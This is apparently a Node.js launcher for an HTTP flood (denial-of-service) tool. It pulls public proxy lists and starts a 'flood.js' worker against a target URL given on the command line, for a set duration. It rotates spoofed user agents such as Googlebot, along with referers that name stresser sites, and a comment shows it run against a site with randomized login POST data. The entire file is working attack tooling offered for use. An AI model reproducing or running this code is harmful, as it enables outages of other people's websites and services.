process.setMaxListeners(0);
var postdata = process.argv[6];
var refer = process.argv[9];
const fs = require("fs");
const cluster = require('cluster');
const requestproxy = require('sync-request');


let res_proxies = requestproxy('GET', 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=4500&country=all&ssl=all&anonymity=all');
let proxy = res_proxies.getBody().toString().match(/.+/g);

const {
    Worker
} = require('worker_threads');
new Worker('./flood.js', {
    workerData: {
        target: process.argv[2].replace(/~/g, '&'),
        proxies: proxy,
        userAgents: ["Mozilla/5.0 (Nintendo WiiU) AppleWebKit/534.52 (KHTML, like Gecko) NX/2.1.0.10.9 NintendoBrowser/1.5.0.8047.EU", "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.28 (KHTML, like Gecko) NX/3.0.3.12.6 NintendoBrowser/2.0.0.9362.EU", "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/534.52 (KHTML, like Gecko) NX/2.1.0.8.23 NintendoBrowser/1.1.0.7579.EU", "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/534.52 (KHTML, like Gecko) NX/2.1.0.8.21 NintendoBrowser/1.0.0.7494.EU", "Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)", "Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)", "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1", "Mozilla/5.0 (Linux; U; Android 2.3.6; fr-fr; Nexus One Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1", "Mozilla/5.0 (Linux; U; Android 2.3.7; fr-fr; Nexus One Build/GWK74) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1", "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; Nexus One Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1", "Bunjalloo/0.7.6(Nintendo DS;U;en)", "Mozilla/5.0 (Nintendo Switch; WebApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.16.10 NintendoBrowser/5.1.0.20923", "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.16.10 NintendoBrowser/5.1.0.20923", "Mozilla/5.0 (Nintendo Switch; WebApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.15.4 NintendoBrowser/5.1.0.20393", "Mozilla/5.0 (Nintendo Switch; ShareApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.9 NintendoBrowser/5.1.0.13341", "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.15.4 NintendoBrowser/5.1.0.20393", "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.9 NintendoBrowser/5.1.0.13341", "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.15.4 NintendoBrowser/5.1.0.20389", "Mozilla/5.0 (Nintendo Switch; WebApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.10.7 NintendoBrowser/5.2.1.17381", "Mozilla/5.0 (Nintendo Switch; WebApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.7.9 NintendoBrowser/5.1.0.15850", "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.13.17 NintendoBrowser/5.1.0.19907", "Mozilla/5.0 (Nintendo Switch; ShareApplet) AppleWebkit/601.6 (KHTML, like Gecko) NF/4.0.0.11.6 NintendoBrowser/5.1.0.18855", "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.8.9 NintendoBrowser/5.1.0.16739", "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393", "Mozilla/5.0 (Windows Phone 10.0; Android 10; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 Edge/16.16299", "Mozilla/5.0 (Windows Phone 10.0; Android 7.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/16.16299", "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586", "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/16.16299"],
        referers: ["https://bytefend.com", "https://www.cloudflare.com", "https://sucuri.net", "https://youtube.com", "https://gmail.com", "https://google.com", "https://yandex.ru", "https://facebook.com", "https://twitter.com", "https://kurdstage.com", "https://stressed.ltd", "https://nightmarestresser.com", "https://skype.com"],
        duration: process.argv[3] * 1e3,
        opt: {
            method: process.argv[5] || "GET",
            body: postdata.replace(/~/g, '&') !== 'false' ? postdata.replace(/~/g, '&') : false,
            ratelimit: process.argv[7] == 'false' ? false : true,
            cookie: process.argv[8] !== 'false' ? process.argv[8] : false,
            refer: refer !== 'false' ? refer : ""
        },
        mode: process.argv[4]
    }}).on('exit', code => {
    if (code) {
        switch (code) {
            case '6':

                break;
        }
    }
});

/*

POST DATA
node method.js https://exitus.xyz 300 request Checked.txt GET username=%RAND%@~@password=%RAND% false

*/

setTimeout(() => {
        process.exit(1)
}, process.argv[3] * 1000)

